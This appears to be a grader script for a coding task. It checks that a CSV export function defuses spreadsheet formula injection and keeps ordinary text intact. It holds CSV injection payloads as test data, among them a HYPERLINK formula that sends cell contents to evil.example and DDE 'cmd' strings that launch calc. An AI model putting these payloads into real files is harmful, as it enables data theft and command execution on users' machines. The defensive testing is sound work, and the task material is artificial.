import csv
import io
import subprocess
import sys

sys.path.insert(0, ".")
fails = []
try:
    import export

    hostile = [
        '=HYPERLINK("https://evil.example/?x="&A1,"open")',
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
    ]
    plain = ["Ana", "late, again", 'said "ok"', "two\nlines", "mail me at a@b.example", "5 = five"]
    rows = []
    for i, value in enumerate(hostile + plain):
        rows.append({"id": i + 1, "name": value, "rating": 1 + i % 5, "comment": value})
    text = export.to_csv(rows).lstrip("\ufeff")
    got = list(csv.reader(io.StringIO(text, newline="")))
    if not got or [c.strip().lower() for c in got[0]] != ["id", "name", "rating", "comment"]:
        fails.append("the header is %r" % (got[:1],))
    if len(got) != len(rows) + 1:
        fails.append("%d rows became %d lines" % (len(rows), len(got) - 1))
    for row, line in zip(rows, got[1:]):
        if len(line) != 4 or line[0] != str(row["id"]) or line[2] != str(row["rating"]):
            fails.append("row %d came out as %r" % (row["id"], line))
            continue
        value = row["comment"]
        for column, cell in (("name", line[1]), ("comment", line[3])):
            if value in hostile:
                runs = cell[:1] in ("=", "+", "-", "@", "\r") or (value.startswith("\t") and cell == value)
                if runs:
                    fails.append("%s from the public form opens as a formula in Excel: %r" % (column, cell))
                elif value.strip() not in cell:
                    fails.append("%s lost what the customer wrote: %r became %r" % (column, value, cell))
            elif cell != value:
                fails.append("ordinary %s %r became %r" % (column, value, cell))
    tests = subprocess.run([sys.executable, "-m", "unittest", "discover", "-q"], capture_output=True, text=True)
    if tests.returncode != 0:
        fails.append("the tests fail: " + tests.stderr[-1500:])
except Exception as e:
    fails.append("verifier could not run: %r" % (e,))
for f in fails:
    print(f, file=sys.stderr)
sys.exit(1 if fails else 0)
